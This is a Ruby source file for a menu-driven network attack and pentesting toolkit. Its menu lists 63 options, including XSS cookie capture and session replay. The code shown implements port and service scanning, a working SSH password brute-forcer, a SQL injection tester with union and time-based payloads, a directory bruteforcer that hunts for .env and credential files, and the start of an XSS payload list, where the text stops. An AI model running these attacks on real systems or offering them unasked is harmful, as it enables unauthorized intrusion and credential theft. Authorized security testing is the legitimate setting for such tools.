# ============================
# Required Gems (Linux version)
# ============================
require 'socket'
require 'net/ping'
require 'json'
require 'colorize'
require 'net/http'
require 'uri'
require 'timeout'
require 'net/ssh'
require 'nokogiri'
require 'selenium-webdriver'
require 'openssl'
require 'httparty'
require 'time'
require 'resolv'
require 'whois'
require 'rbconfig'
require 'concurrent'
require 'set'
require 'dnsruby'
# win32-security REMOVED for Linux version
# require 'packetgen' # Optional future Linux use

# ============================
# Color Styling Constants
# ============================
BRIGHT_GREEN = "\e[1;92m"
BRIGHT_RED = "\e[1;91m"
BRIGHT_YELLOW = "\e[1;93m"
BRIGHT_CYAN = "\e[1;96m"
RESET = "\e[0m"
GRAY = "\e[90m"
BRIGHT_BLUE = "\e[94m"
BRIGHT_MAGENTA = "\e[95m"

# ============================
# Loading Visual
# ============================
def display_loading(message, duration = 2)
  print "#{BRIGHT_CYAN}#{message}#{RESET}"
  duration.times do
    print "."
    sleep(0.5)
  end
  puts " Done!"
end

# ============================
# Global Data Store
# ============================
$gathered_data = {
  network_details: {},
  vulnerabilities: [],
  waf_detection: [],
  directory_listing: [],
  xss_vulnerabilities: [],
  sql_injections: [],
  https_analysis: []
}

# ============================
# Menu Display
# ============================
def display_menu
  options = [
    "1.  Display Net Config", "2.  Ping Address/Domain", "3.  Monitor Open Ports",
    "4.  Scan Local Network", "5.  Basic Vuln Check", "6.  Service Fingerprint Summary",
    "7.  Port Scan w/ Detection", "8.  SSH Brute Force", "9.  Web Vuln Scanner",
    "10. SQL Injection Tester", "11. Directory Bruteforcer", "12. XSS Scanner",
    "13. HTTPS Analysis", "14. OSINT Email Breach Lookup", "15. Telegram Bot Alerts",
    "16. ARP Scanning", "17. Detect ARP Spoofing", "18. Exit",
    "19. Cert Subdomain & IP Discovery", "20. DNS Zone Transfer Tester",
    "21. CORS Misconfiguration Scanner", "22. Open Redirect Finder",
    "23. Setup for AI Assistant", "24. ChatGPT AI Assistant", "25. Domain Info Gathering",
    "26. XSS Exploit & Cookie Capture", "27. Replay Cookie Session",
    "28. Session Verify & Device Info", "29. Network Info During Session",
    "30. Analyze Cookie File", "31. Check for WordPress Auth Cookies",
    "32. Replay into WP-Admin & Detect Dashboard", "33. Start XSS Beacon Server", 
    "34. Generate XSS Beacon Payload", "35. Show Beacon Logs",
    "36. Absolute Path Traversal Test", "37. Storage Enumerator",
    "38. Batch Scan(BugBounty Specific)", "39. DNS Bruteforce Subdomains",
    "40. Subdomain Takeover Scan", "41. S3 Bucket Enumeration", "42. JWT Decode",
    "43. AES-CBC Decrypt", "44. Nmap NSE Vulnerability Scan", "45. HTTPS Handshake Debug",
    "46. NGINX Stub Status Check", "47. WebDAV Method Probe", "48. NGINX Version Fingerprint",
    "49. Analyze Target TLS & Headers", "50. CloudFront Misconfiguration Scan",
    "51. Subdomain Takeover Detector", "52. CNAME Takeover Verifier",
    "53. IDOR Parameter Tester", "54. Host Header Injection Tester",
    "55. Sensitive File Prober", "56. TLS Debug Inspector",
    "57. Cert Transparency Subdomain Leaker", "58. TLS Weak Cipher/Protocol Checker",
    "59. Cert Expiry & OCSP Health", "60. Chain Exploit Tester",
    "61. Server-Side Leak Sniffer", "62. Cloudflare JS Bypass Checker",
    "63. Chained TLS Header Bypass Tester"
  ]

  half = (options.size + 1) / 2
  left = options[0, half]
  right = options[half, half] || []
  right += [""] * (left.size - right.size)

  puts "\n#{BRIGHT_GREEN}======== Network Security and Pentesting Tool ========#{RESET}"
  left.zip(right).each { |l, r| printf("  %-35s %s\n", l, r) }

  print "#{BRIGHT_CYAN}Please choose an option (1-#{options.size}): #{RESET}"
end

# ============================
# ARP Data Store
# ============================
$arp_scan_data = []

# ============================
# Detect Default Interface (Linux only)
# ============================
def detect_capture_interface
  `ip route show default`.match(/dev (\S+)/)[1]
end
# Function 25: Passive Network Traffic Sniffing (Linux - PacketGen)
def network_traffic_analysis
  puts "#{BRIGHT_GREEN}=== Network Traffic Analysis (Passive Sniffing) ===#{RESET}"
  puts "#{BRIGHT_YELLOW}Step 1: Quick ARP scan to seed known hosts...#{RESET}"
  arp_scanning

  iface = detect_capture_interface
  puts "#{BRIGHT_YELLOW}Step 2: Listening on #{iface} for ARP/TCP/UDP packets (15s)...#{RESET}"
  display_loading("Starting packet capture", 2)

  seen_hosts       = {}
  seen_connections = {}

  begin
    cap = PacketGen::Capture.new(
      iface:  iface,
      filter: 'arp or tcp or udp',
      max:     1000,
      timeout: 15
    )
    cap.start

    cap.each do |pkt|
      if pkt.is?('ARP')
        seen_hosts[pkt.arp.spa] ||= pkt.arp.sha
      elsif pkt.is?('IP')
        src, dst = pkt.ip.src, pkt.ip.dst
        if pkt.is?('TCP')
          seen_connections["#{src}:#{pkt.tcp.sport} → #{dst}:#{pkt.tcp.dport}"] = true
        elsif pkt.is?('UDP')
          seen_connections["#{src}:#{pkt.udp.sport} → #{dst}:#{pkt.udp.dport}"] = true
        end
      end
    end
  rescue => e
    puts "#{BRIGHT_RED}Packet capture error: #{e.message}#{RESET}"
    return
  end

  puts "\n#{BRIGHT_GREEN}Discovered Hosts via Passive Sniffing:#{RESET}"
  seen_hosts.each { |ip, mac| puts "  #{ip.ljust(15)}  MAC: #{mac}" }

  puts "\n#{BRIGHT_GREEN}Observed Connections:#{RESET}"
  if seen_connections.empty?
    puts "  (no TCP/UDP flows seen during capture window)"
  else
    seen_connections.keys.each { |flow| puts "  #{flow}" }
  end

  $gathered_data[:network_activity] = {
    hosts:       seen_hosts.map    { |ip,mac| { ip: ip, mac: mac } },
    connections: seen_connections.keys
  }

  puts "\n#{BRIGHT_GREEN}Passive traffic analysis complete.#{RESET}"
end
# Function 5: Basic Vulnerability Check
def basic_vulnerability_check
  puts "\n#{'Performing Basic Vulnerability Check...'.colorize(:light_yellow)}"
  display_loading("Scanning open ports")

  common_ports = [22, 80, 443]
  localhost = '127.0.0.1'
  open_ports = []

  common_ports.each do |port|
    begin
      Timeout.timeout(1) do
        socket = TCPSocket.new(localhost, port)
        open_ports << port
        socket.close
      end
    rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH, Timeout::Error
      next
    end
  end

  if open_ports.empty?
    puts "No common vulnerable ports found on the local machine.".colorize(:green)
  else
    puts "Warning! The following common ports are open: #{open_ports.join(', ')}".colorize(:red)
  end

  display_loading("Checking software versions")
  outdated_software = check_software_versions # ← this must be defined elsewhere

  if outdated_software.empty?
    puts "No outdated software detected.".colorize(:green)
  else
    puts "Outdated Software Detected:".colorize(:red)
    outdated_software.each do |software, version|
      puts "  - #{software}: #{version}".colorize(:yellow)
    end
  end
  puts "Basic Vulnerability Check Completed.".colorize(:green)
end
def scan_local_network
  puts "\n#{BRIGHT_GREEN}=== Scanning Local Network for Active Devices ===#{RESET}"

  ai = Socket.ip_address_list.find { |ai| ai.ipv4? && !ai.ipv4_loopback? }
  default = ai.ip_address.sub(/\d+$/, '')
  print "#{BRIGHT_CYAN}Enter network prefix (e.g., #{default}) or press Enter to use detected: #{RESET}"
  prefix = gets.chomp.strip
  prefix = default if prefix.empty?
  prefix += '.' unless prefix.end_with?('.')

  subnet = "#{prefix}0/24"
  active_devices = []

  if system('command -v nmap > /dev/null 2>&1')
    puts "#{BRIGHT_YELLOW}Using nmap ping scan on #{subnet}#{RESET}"
    output = `nmap -sn #{subnet}`
    output.each_line do |line|
      if line =~ /^Nmap scan report for ([\d\.]+)/
        ip = $1
        active_devices << ip
        puts "#{BRIGHT_GREEN}Active: #{ip}#{RESET}"
      end
    end
  else
    puts "#{BRIGHT_YELLOW}nmap not found—falling back to ICMP ping#{RESET}"
    require 'net/ping'
    mutex = Mutex.new
    (1..254).each_slice(50) do |batch|
      threads = batch.map do |i|
        Thread.new do
          ip = "#{prefix}#{i}"
          if Net::Ping::External.new(ip, nil, 1).ping
            mutex.synchronize { active_devices << ip }
            puts "#{BRIGHT_GREEN}Active: #{ip}#{RESET}"
          end
        end
      end
      threads.each(&:join)
    end
  end

  $gathered_data[:network_details][:active_devices] = active_devices
  puts "\n#{BRIGHT_GREEN}Scan complete. Found #{active_devices.size} active devices.#{RESET}"
end
def check_software_versions
  versions = {
    "Ruby" => `ruby -v`.strip,
    "Nmap" => begin
                `nmap --version`.strip.split("\n").first
              rescue
                "Not Installed"
              end,
    "OpenSSL" => begin
                  `openssl version`.strip
                rescue
                  "Not Installed"
                end
  }

  outdated = {}
  versions.each do |software, version|
    next if version.include?("Not Installed")

    if software == "Ruby" && version.match(/ruby (\d+\.\d+)/)
      current = version.match(/ruby (\d+\.\d+)/)[1].to_f
      outdated[software] = version if current < 3.0
    end
  end

  outdated
end
def display_network_configuration
  display_loading("Gathering network configuration", 3)

  puts "#{BRIGHT_GREEN}Network Configuration:#{RESET}"
  config = if system('command -v ip > /dev/null 2>&1')
             `ip a`
           elsif system('command -v ifconfig > /dev/null 2>&1')
             `ifconfig`
           else
             "Neither 'ip' nor 'ifconfig' is available."
           end

  puts config
end
# Function 2: Ping Address/Domain
def ping_address
  print "#{BRIGHT_CYAN}Enter an IP address or domain to ping: #{RESET}"
  address = gets.chomp
  display_loading("Pinging #{address}", 4)

  begin
    if Net::Ping::External.new(address).ping
      puts "#{BRIGHT_GREEN}Ping to #{address} was successful!#{RESET}"
    else
      puts "#{BRIGHT_RED}Ping to #{address} failed.#{RESET}"
    end
  rescue
    puts "#{BRIGHT_YELLOW}Net::Ping failed, trying system ping...#{RESET}"
    result = system("ping -c 1 #{address} > /dev/null 2>&1")
    if result
      puts "#{BRIGHT_GREEN}Ping to #{address} was successful!#{RESET}"
    else
      puts "#{BRIGHT_RED}Ping to #{address} failed.#{RESET}"
    end
  end
end
# Function 3: Monitor Open Ports
def monitor_open_ports
  puts "\n#{BRIGHT_GREEN}=== Scanning Open Ports on Local Machine ===#{RESET}"
  
  localhost = '127.0.0.1'
  common_ports = [22, 80, 443, 8080, 3306] # Example common ports to scan
  open_ports = []

  common_ports.each do |port|
    begin
      display_loading("Checking port #{port}", 1)
      socket = TCPSocket.new(localhost, port)
      puts "#{BRIGHT_GREEN}Port #{port} is open!#{RESET}"
      open_ports << port
      socket.close
    rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH, SocketError, Timeout::Error
      puts "#{BRIGHT_RED}Port #{port} is closed or unreachable.#{RESET}"
    end
  end

  if open_ports.empty?
    puts "#{BRIGHT_YELLOW}No open ports detected on the local machine.#{RESET}"
  else
    puts "#{BRIGHT_GREEN}Open Ports: #{open_ports.join(', ')}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# --- Function 6, corrected: Service Fingerprint Summary with Deep Fingerprinting ---
def service_fingerprint_summary
  require 'uri'
  require 'resolv'
  require 'socket'
  require 'openssl'
  require 'concurrent'
  require 'net/http'
  require 'json'
  require 'set'
  require 'time'

  # CIRCL CVE API helper as a lambda
  lookup_cves = lambda do |product|
    url = URI("https://cve.circl.lu/api/search/#{product}")
    res = Net::HTTP.get_response(url)
    return [] unless res.is_a?(Net::HTTPSuccess)
    data = JSON.parse(res.body) rescue {}
    (data["data"] || []).first(3).map { |c| c["id"] }
  rescue
    []
  end

  # Supported TLS versions mapping (local variable)
  tls_versions = {
    "TLSv1.0" => :TLSv1,
    "TLSv1.1" => :TLSv1_1,
    "TLSv1.2" => :TLSv1_2,
    "TLSv1.3" => :TLSv1_3
  }

  # 1) Define ports & default names
  common_ports = {
    21   => "FTP",
    22   => "SSH",
    25   => "SMTP",
    53   => "DNS",
    80   => "HTTP",
    110  => "POP3",
    143  => "IMAP",
    443  => "HTTPS",
    3306 => "MySQL",
    3389 => "RDP",
    8080 => "HTTP-Proxy"
  }

  # 2) Prompt & normalize hosts
  print "#{BRIGHT_CYAN}Enter hosts (comma-separated), or blank to reuse last scan: #{RESET}"
  raw = gets.chomp.strip
  hosts = if raw.empty? && $gathered_data.dig(:network_details, :active_devices)
    $gathered_data[:network_details][:active_devices]
  else
    raw.split(',').map do |h|
      h = h.strip
      begin
        URI.parse(h).host || h
      rescue
        h
      end.downcase
    end.uniq
  end

  if hosts.empty?
    puts "#{BRIGHT_RED}No hosts provided or found. Run a network scan first!#{RESET}"
    return
  end

  # 3) Build and dispatch probe jobs in parallel
  jobs    = hosts.flat_map { |host| common_ports.keys.map { |port| { host: host, port: port } } }
  results = Concurrent::Array.new
  pool    = Concurrent::FixedThreadPool.new(20)

  puts "\n#{BRIGHT_YELLOW}Launching #{jobs.size} probes on #{hosts.size} host(s)…#{RESET}"
  jobs.each do |job|
    pool.post do
      host = job[:host]; port = job[:port]

      # Skip if DNS fails
      ip = begin Resolv.getaddress(host) rescue nil end
      next unless ip

      # Fast TCP connect
      sock = begin Socket.tcp(host, port, connect_timeout: 2) rescue nil end
      next unless sock

      service = common_ports[port]
      detail  = nil

      # Protocol fingerprinting
      begin
        io = if port == 443
               ctx = OpenSSL::SSL::SSLContext.new
               ssl = OpenSSL::SSL::SSLSocket.new(sock, ctx)
               ssl.hostname = host; ssl.connect
               ssl
             else
               sock
             end

        case port
        when 80, 8080
          io.write "GET / HTTP/1.1\r\nHost: #{host}\r\nConnection: close\r\n\r\n"
          hdrs = ""
          hdrs << io.gets while (l = io.gets) && !l.strip.empty?
          if srv = hdrs[/^Server:\s*(.+)$/i,1]
            service = "HTTP"; detail = srv.strip
          end

        when 443
          cert   = io.peer_cert
          cn     = cert.subject.to_a.assoc('CN')&.last
          issuer = cert.issuer.to_a.assoc('O')&.last
          exp    = cert.not_after.strftime("%Y-%m-%d")
          ciph   = io.cipher[0]
          service = "HTTPS"
          detail  = "CN=#{cn}; Iss=#{issuer}; Exp=#{exp}; Ciph=#{ciph}"

        when 22
          ban = io.gets&.strip
          service = "SSH"; detail = ban

        when 21
          ban = io.gets&.strip
          service = "FTP"; detail = ban
          io.write "USER anonymous\r\n"; io.gets
          io.write "PASS anonymous@\r\n"
          resp = io.gets&.strip
          detail += " | Auth: #{resp}"

        when 25
          io.gets
          io.write "EHLO scanner\r\n"
          caps = []
          caps << io.gets.strip while io.gets&.start_with?("250-")
          service = "SMTP"; detail = caps.join("; ")

        when 110
          io.gets
          io.write "CAPA\r\n"
          pops = []
          while (l = io.gets)&.start_with?("+OK") do pops << l.strip end
          service = "POP3"; detail = pops.join("; ")

        when 143
          io.gets
          io.write "a001 CAPABILITY\r\n"
          cap = io.gets&.strip
          service = "IMAP"; detail = cap

        when 3306
          pkt = io.readpartial(256) rescue io.read
          if m = pkt&.match(/[\x09-\x0d\x20-\x7e]+/) then service="MySQL"; detail=m[0] end

        when 3389
          ban = io.read_nonblock(256) rescue io.read rescue nil
          service = "RDP"; detail = ban&.strip
        end
      rescue
      ensure
        io.close rescue nil
      end

      # Reverse DNS
      ptr = begin Socket.getnameinfo([ip,0])[0] rescue nil end

      results << { host: host, ip: ip, port: port, service: service, detail: detail, ptr: ptr }
    end
  end

  pool.shutdown
  pool.wait_for_termination

  if results.empty?
    puts "#{BRIGHT_RED}No open ports detected on any of the provided hosts.#{RESET}"
    return
  end

  # 4) TLS version & cipher support per host
  tls_support = {}
  hosts.each do |host|
    next unless results.any? { |r| r[:host]==host && r[:port]==443 }
    tls_support[host] = []
    tls_versions.each do |label, vers|
      begin
        tcp = Socket.tcp(host, 443, connect_timeout: 2)
        ctx = OpenSSL::SSL::SSLContext.new; ctx.ssl_version = vers
        ssl = OpenSSL::SSL::SSLSocket.new(tcp, ctx)
        ssl.hostname = host; ssl.connect
        tls_support[host] << "#{label}:#{ssl.cipher[0]}"
        ssl.close; tcp.close
      rescue
      end
    end
  end

  # 5) Aggregate stats & CVE lookup
  stats = {}
  results.each do |r|
    svc = r[:service]
    stats[svc] ||= { count: 0, ports: Set.new, samples: Set.new, cves: Set.new }
    stats[svc][:count]   += 1
    stats[svc][:ports]   << r[:port]
    stats[svc][:samples] << r[:detail] if r[:detail]
  end

  stats.each do |svc, v|
    # pick a sample string, split to get product token
    if s = v[:samples].find { |d| d&.include?("/") || d&.include?(" ") }
      prod = s.split(/[\/\s]/).first.downcase
      lookup_cves.call(prod).each { |c| v[:cves] << c }
    end
  end

  total = results.size

  # 6) Print summary table
  puts "\n#{BRIGHT_GREEN}=== Service Fingerprint Summary ===#{RESET}"
  puts "Scan Time : #{Time.now.iso8601}"
  puts "Hosts     : #{hosts.join(', ')}\n\n"

  hdr = "| %-12s | %-5s | %-7s | %-12s | %-25s | %-15s |"
  puts hdr % ["Service", "Count", "Percent", "Ports", "Sample Detail", "CVEs"]
  puts "-" * 92
  stats.sort_by { |_,v| -v[:count] }.each do |svc, v|
    pct    = (v[:count]*100.0/total).round(1)
    ports  = v[:ports].to_a.sort.join(',')
    sample = v[:samples].to_a.first.to_s[0..24]
    cves   = v[:cves].to_a.join(',')[0..14]
    puts hdr % [svc, v[:count], "#{pct}%", ports, sample, cves]
  end

  # 7) TLS details per host
  if tls_support.any?
    puts "\n#{BRIGHT_GREEN}=== TLS Versions & Ciphers ===#{RESET}"
    tls_support.each do |host, arr|
      puts "#{host}:"
      arr.each { |e| puts "  • #{e}" }
    end
  end

  # 8) Store for downstream modules
  $gathered_data[:service_fingerprints] = stats.transform_values { |v| v[:count] }
  $gathered_data[:tls_support]         = tls_support
  $gathered_data[:osint_domains]       = hosts + results.map { |r| r[:ptr] }.compact
  $gathered_data[:cve_lookup]          = stats.transform_values { |v| v[:cves].to_a }
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function for Port Scanning with Service Detection (#7)
def port_scanning_with_service_detection
  require 'uri'
  require 'timeout'  # Ensure timeout is required

  puts "\n#{BRIGHT_GREEN}=== Starting Port Scanning with Service Detection ===#{RESET}"

  # Prompt for target and normalize
  print "#{BRIGHT_CYAN}Enter the IP address or hostname to scan: #{RESET}"
  raw = gets.chomp.strip
  host = begin
           uri = URI.parse(raw)
           uri.host || raw
         rescue URI::InvalidURIError
           raw
         end

  puts "#{BRIGHT_YELLOW}Scanning host: #{host}#{RESET}"

  open_ports = []
  common_ports = {
    22 => "SSH",
    80 => "HTTP",
    443 => "HTTPS",
    21 => "FTP",
    25 => "SMTP",
    53 => "DNS",
    110 => "POP3",
    143 => "IMAP",
    3306 => "MySQL",
    3389 => "RDP",
    8080 => "HTTP Proxy"
  }

  common_ports.each do |port, service|
    # Display progress animation
    display_loading("Checking port #{port} (#{service})", 1)
    begin
      Timeout.timeout(2) do
        socket = TCPSocket.new(host, port)
        puts "#{BRIGHT_GREEN}Port #{port} (#{service}) is open!#{RESET}"
        open_ports << port
        socket.close
      end
    rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH, SocketError, Timeout::Error
      puts "#{BRIGHT_RED}Port #{port} (#{service}) is closed or unreachable.#{RESET}"
    rescue StandardError => e
      puts "#{BRIGHT_RED}Port #{port} (#{service}) scan error: #{e.class} - #{e.message}#{RESET}"
    end
  end

  # Summarize results
  if open_ports.empty?
    puts "#{BRIGHT_YELLOW}No open ports detected on #{host}.#{RESET}"
  else
    puts "#{BRIGHT_GREEN}Open Ports on #{host}: #{open_ports.join(', ')}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function to perform SSH port scanning before brute-force (#8+)
def automatic_ssh_port_scan(target)
  puts "\n#{BRIGHT_GREEN}Performing a quick port scan to detect SSH ports on #{target}...#{RESET}"
  ssh_ports = []
  common_ports = [22, 2222, 2022, 2200, 443] # Common SSH ports

  common_ports.each do |port|
    begin
      Timeout.timeout(1) do
        socket = TCPSocket.new(target, port)
        if port == 443
          puts "#{BRIGHT_RED}Warning: Detected port 443. This is usually for HTTPS, not SSH.#{RESET}"
        else
          ssh_ports << port
        end
        socket.close
      end
    rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH, SocketError, Timeout::Error
      next
    end
  end

  if ssh_ports.empty?
    puts "#{BRIGHT_YELLOW}No SSH ports found on #{target}. Exiting brute-force attempt.#{RESET}"
    return []
  else
    puts "#{BRIGHT_GREEN}Found SSH ports: #{ssh_ports.join(', ')}#{RESET}"
    return ssh_ports
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function for SSH login brute-force testing (#8)
def ssh_brute_force
  puts "\n#{BRIGHT_GREEN}=== SSH Login Brute Force ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter target IP address: #{RESET}"
  ip = gets.chomp

  # Auto-detect SSH ports
  ssh_ports = automatic_ssh_port_scan(ip)
  return if ssh_ports.empty?

  print "#{BRIGHT_CYAN}Enter SSH username: #{RESET}"
  username = gets.chomp
  print "#{BRIGHT_CYAN}Enter path to password file: #{RESET}"
  file_path = gets.chomp

  unless File.exist?(file_path)
    puts "#{BRIGHT_RED}Password file not found!#{RESET}"
    return
  end

  puts "\n#{BRIGHT_GREEN}Starting SSH brute force attack on #{ip} (user: #{username})...#{RESET}"
  log_file = 'ssh_bruteforce_log.txt'

  ssh_ports.each do |port|
    puts "\n#{BRIGHT_YELLOW}Testing SSH on port #{port}...#{RESET}"
    File.readlines(file_path).each do |pw|
      password = pw.chomp
      begin
        Net::SSH.start(
          ip,
          username,
          password:         password,
          port:             port,
          non_interactive:  true,
          timeout:          10,
          auth_methods:     ['password'],
          keys:             [],
          verify_host_key:  :never
        ) do |session|
          puts "#{BRIGHT_GREEN}Success: Password is #{password}#{RESET}"
          session.close
          return
        end

      rescue Net::SSH::AuthenticationFailed
        puts "Failed: #{password}"
        File.open(log_file, 'a') do |f|
          f.puts("[#{Time.now}] Auth failed on #{ip}:#{port} with #{password}")
        end

      rescue Errno::ECONNRESET
        puts "#{BRIGHT_YELLOW}Connection reset by peer with password #{password}, retrying...#{RESET}"
        next

      rescue Net::SSH::ConnectionTimeout
        puts "#{BRIGHT_RED}Connection Timeout on #{ip}:#{port}.#{RESET}"
        File.open(log_file, 'a') {|f| f.puts("[#{Time.now}] Timeout on #{ip}:#{port}") }
        next

      rescue StandardError => e
        puts "#{BRIGHT_RED}Error: #{e.class} – #{e.message}#{RESET}"
        File.open(log_file, 'a') {|f| f.puts("[#{Time.now}] Error: #{e.class} – #{e.message}") }
        next
      end
    end
  end

  puts "#{BRIGHT_YELLOW}Brute-force complete, no valid password found.#{RESET}"
end
def web_vulnerability_scanner
  print "#{BRIGHT_CYAN}Enter target URL (e.g., http://example.com): #{RESET}"
  raw = gets.chomp.strip
  url = raw =~ %r{\Ahttps?://}i ? raw : "http://#{raw}"

  puts "#{BRIGHT_YELLOW}Launching headless browser for #{url}...#{RESET}"
  options = Selenium::WebDriver::Chrome::Options.new
  options.add_argument('--headless')
  options.add_argument('--no-sandbox')
  options.add_argument('--disable-dev-shm-usage')

  begin
    driver = Selenium::WebDriver.for(:chrome, options: options)
  rescue => e
    puts "#{BRIGHT_RED}Error initializing browser: #{e.message}#{RESET}"
    return
  end

  begin
    driver.navigate.to(url)
  rescue => e
    puts "#{BRIGHT_RED}Failed to navigate to #{url}: #{e.message}#{RESET}"
    driver.quit rescue nil
    return
  end

  begin
    page_source = driver.page_source
    puts "\n#{BRIGHT_GREEN}=== HTTP Response Analysis for #{url} ===#{RESET}"
    puts "Page Title: #{driver.title}"

    # Extract HTTP headers using JavaScript from meta tags
    puts "\n#{BRIGHT_YELLOW}Checking headers for security issues...#{RESET}"
    headers = driver.execute_script(
      "return Object.fromEntries(Array.from(document.querySelectorAll('meta')).map(m => [m.getAttribute('http-equiv')||m.getAttribute('name'), m.getAttribute('content')]))"
    )
    check_security_headers(headers)

    check_directory_listing(page_source)
    scan_dynamic_forms(driver, url)
  rescue => e
    puts "#{BRIGHT_RED}Error during scanning: #{e.message}#{RESET}"
  ensure
    driver.quit
  end
end
# SQL Injection Testing Function with Enhanced Data Storage (#10)
def sql_injection_test
  print "\n#{BRIGHT_CYAN}Enter the target URL with a parameter (e.g., http://example.com/page?id=1): #{RESET}"
  target_url = gets.chomp.strip
  uri = URI.parse(target_url)

  # List of SQL payloads to test
  sql_payloads = [
    { payload: "' OR '1'='1", description: "Generic SQL bypass" },
    { payload: "' OR SLEEP(5) --", description: "MySQL time-based injection" },
    { payload: "'; SELECT pg_sleep(5) --", description: "PostgreSQL time-based injection" },
    { payload: "' AND 1=0 UNION SELECT table_name, null FROM information_schema.tables --", description: "Union-based Injection" },
    { payload: "' AND 1=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' --", description: "Column extraction" }
  ]

  puts "\n#{BRIGHT_GREEN}=== Starting SQL Injection Test on #{target_url} ===#{RESET}"
  puts "Testing each parameter with a variety of SQL injection payloads...\n"
  uri_params = URI.decode_www_form(uri.query || "").to_h

  if uri_params.empty?
    puts "#{BRIGHT_RED}No parameters found in the URL. Please provide a URL with parameters.#{RESET}"
    return
  end

  uri_params.each do |param, value|
    puts "\n#{BRIGHT_YELLOW}Testing parameter: #{param}#{RESET}"

    sql_payloads.each do |entry|
      payload = entry[:payload]
      description = entry[:description]
      test_params = uri_params.clone
      test_params[param] = payload
      test_uri = uri.dup
      test_uri.query = URI.encode_www_form(test_params)

      begin
        start_time = Time.now
        http = Net::HTTP.new(test_uri.host, test_uri.port)
        http.use_ssl = (test_uri.scheme == 'https')
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE
        request = Net::HTTP::Get.new(test_uri.request_uri)
        response = http.request(request)
        response_time = Time.now - start_time

        finding = {
          parameter: param,
          payload: payload,
          description: description,
          response_code: response.code,
          response_headers: response.to_hash,
          response_snippet: response.body[0..500],
          response_time: response_time.round(2),
          is_vulnerable: response.body.include?("syntax error") || response.body.include?("SQL")
        }

        record_finding(:sql_injections, finding)

        if finding[:is_vulnerable]
          puts "#{BRIGHT_RED}Potential SQL Injection detected: #{finding[:description]} in parameter: #{param}#{RESET}"
          puts "Payload: #{payload}"
          puts "Response Snippet: #{finding[:response_snippet]}..."
        else
          puts "Tested with payload: #{payload} - No issues detected."
        end

      rescue => e
        puts "#{BRIGHT_RED}Error testing payload #{payload} in parameter #{param}: #{e.message}#{RESET}"
      end
    end
  end

  save_to_file
end
def record_finding(category, finding)
  $gathered_data[category] ||= []
  $gathered_data[category] << finding
  puts "#{BRIGHT_GREEN}Recorded finding in category #{category}: #{finding}#{RESET}"
end

def save_to_file
  File.open("pentest_results.json", "w") do |f|
    f.write(JSON.pretty_generate($gathered_data))
  end
  puts "#{BRIGHT_GREEN}Findings saved to pentest_results.json#{RESET}"
end
#----------------------------------------------------------------------------------------------------------------------------------------
# DIRECTORY BRUTEFORCER WITH SENSITIVE DATA DETECTION (#11)
def directory_bruteforcer_sensitive
  require 'net/http'
  require 'uri'
  require 'json'

  sensitive_patterns = [
    /password/i, /secret/i, /token/i, /apikey/i,
    /\.env/, /\.git\/config/, /dump/i, /backup/i,
    /credential/i
  ]

  puts "\n#{BRIGHT_GREEN}=== Directory & File Bruteforcer with Sensitive-Data Detection ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter base URL (e.g. example.com/ or https://site/): #{RESET}"
  raw = gets.chomp.strip
  raw = raw =~ %r{\Ahttps?://}i ? raw : "http://#{raw}"
  begin
    base = URI.parse(raw)
    raise unless base.host
  rescue
    puts "#{BRIGHT_RED}[!] Invalid URL.#{RESET}"
    return
  end

  # ensure exactly one trailing slash
  base.path = "/" if base.path.empty?
  base.path = base.path.end_with?("/") ? base.path : "#{base.path}/"

  print "Enter path to your wordlist file (or leave blank to use default): "
  wpath = gets.chomp.strip

  words = if !wpath.empty? && File.exist?(wpath)
    File.readlines(wpath).map(&:strip).reject(&:empty?)
  else
    %w[admin login config uploads .env .git/config backup sitemap.xml]
  end

  puts "\n#{BRIGHT_YELLOW}[*] Testing #{words.size} entries…#{RESET}\n\n"
  findings = []

  # GET + follow up to 3 redirects
  fetch = lambda do |uri, limit = 3|
    res = Net::HTTP.start(uri.host, uri.port,
                          use_ssl: uri.scheme == "https",
                          open_timeout: 5, read_timeout: 5) do |http|
      http.get(uri.request_uri)
    end
    if (300..399).include?(res.code.to_i) && res['location'] && limit > 0
      fetch.call(URI.join(uri, res['location']), limit - 1)
    else
      [uri, res]
    end
  end

  words.each do |word|
    suffix = word.include?('.') ? word : "#{word}/"
    uri = base.dup
    uri.path = base.path + suffix

    print "→ #{uri} … "
    begin
      final_uri, res = fetch.call(uri)
    rescue => e
      puts "#{BRIGHT_RED}Err (#{e.class})#{RESET}"
      next
    end

    code = res.code.to_i
    color = case code
            when 200..299 then BRIGHT_GREEN
            when 300..399 then BRIGHT_YELLOW
            else               BRIGHT_RED
            end

    puts "#{color}#{code}#{RESET}"

    if code.between?(200, 299)
      body = res.body.to_s
      snippet = body.lines.first(6).map(&:chomp).map { |l| "    #{l}" }.join("\n")
      matches = sensitive_patterns.select { |rx| body.match?(rx) }

      puts "   📝 Snippet:"
      puts snippet.empty? ? "    (no content)" : snippet
      if matches.any?
        puts "   ⚠️  Sensitive patterns: #{matches.map(&:source).join(', ')}"
      end

      findings << {
        url: final_uri.to_s,
        code: code,
        snippet: snippet,
        sensitive: matches.any?,
        matched: matches.map(&:source),
        body: body
      }
    end
  end

  out_file = "dir_bruteforce_sensitive_#{Time.now.to_i}.json"
  File.write(out_file, JSON.pretty_generate(
    scanned_at: Time.now.iso8601,
    base: "#{base.scheme}://#{base.host}#{base.path}",
    found: findings
  ))

  if findings.empty?
    puts "\n#{BRIGHT_YELLOW}No resources discovered.#{RESET}"
  else
    puts "\n#{BRIGHT_GREEN}Discovered #{findings.size} resource#{'s' if findings.size > 1} — saved to #{out_file}:#{RESET}"
    findings.each do |f|
      flag = f[:sensitive] ? " ⚠️" : ""
      puts " • #{f[:url]} (HTTP #{f[:code]})#{flag}"
    end
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# XSS SCANNER FUNCTION (#12)
XSS_PAYLOADS = [
  "<script>alert('XSS')</script>",
  "'><script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "<svg onload=alert('XSS')>",
